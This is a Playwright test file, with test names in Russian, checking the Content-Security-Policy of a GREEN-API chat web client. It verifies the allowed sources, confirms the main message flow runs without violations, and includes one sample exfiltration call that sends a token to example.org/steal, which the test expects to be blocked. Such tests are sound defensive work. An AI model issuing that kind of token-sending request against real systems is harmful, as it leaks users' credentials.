import { expect, test } from '@playwright/test'

import { TEST_CREDENTIALS, mockGreenApi } from './greenApiMock.ts'

test.describe('Content-Security-Policy', () => {
	test('в собранной странице разрешены только свой адрес и API GREEN-API', async ({ page }) => {
		await page.goto('/')

		const policy = page.locator('meta[http-equiv="Content-Security-Policy"]')
		await expect(policy).toHaveAttribute('content', /script-src 'self'/)
		await expect(policy).toHaveAttribute('content', /connect-src 'self' https:\/\/\*\.api\.green-api\.com/)
	})

	test('запрос на посторонний сервер блокируется: токен некуда отправить', async ({ page }) => {
		await page.goto('/')

		const result = await page.evaluate(() =>
			fetch('https://example.org/steal?token=secret').then(
				() => 'отправлено',
				() => 'заблокировано'
			)
		)

		expect(result).toBe('заблокировано')
	})

	test('основной сценарий работает без нарушений политики', async ({ page }) => {
		const violations: string[] = []
		page.on('console', (message) => {
			if (message.text().includes('Content Security Policy')) {
				violations.push(message.text())
			}
		})
		await mockGreenApi(page)

		await page.goto('/')
		await page.getByLabel('idInstance').fill(TEST_CREDENTIALS.idInstance)
		await page.getByLabel('apiTokenInstance').fill(TEST_CREDENTIALS.apiTokenInstance)
		await page.getByRole('button', { name: 'Войти' }).click()
		await expect(page.getByRole('heading', { name: 'Чаты' })).toBeVisible()
		await page.getByRole('button', { name: 'Новый чат' }).click()
		await page.getByLabel('Номер телефона').fill('916 123-45-67')
		await page.getByRole('button', { name: 'Начать чат' }).click()
		await page.getByPlaceholder('Сообщение').fill('проверка политики')
		await page.keyboard.press('Enter')
		await expect(page.getByText('проверка политики')).toHaveCount(2)

		expect(violations).toEqual([])
	})
})
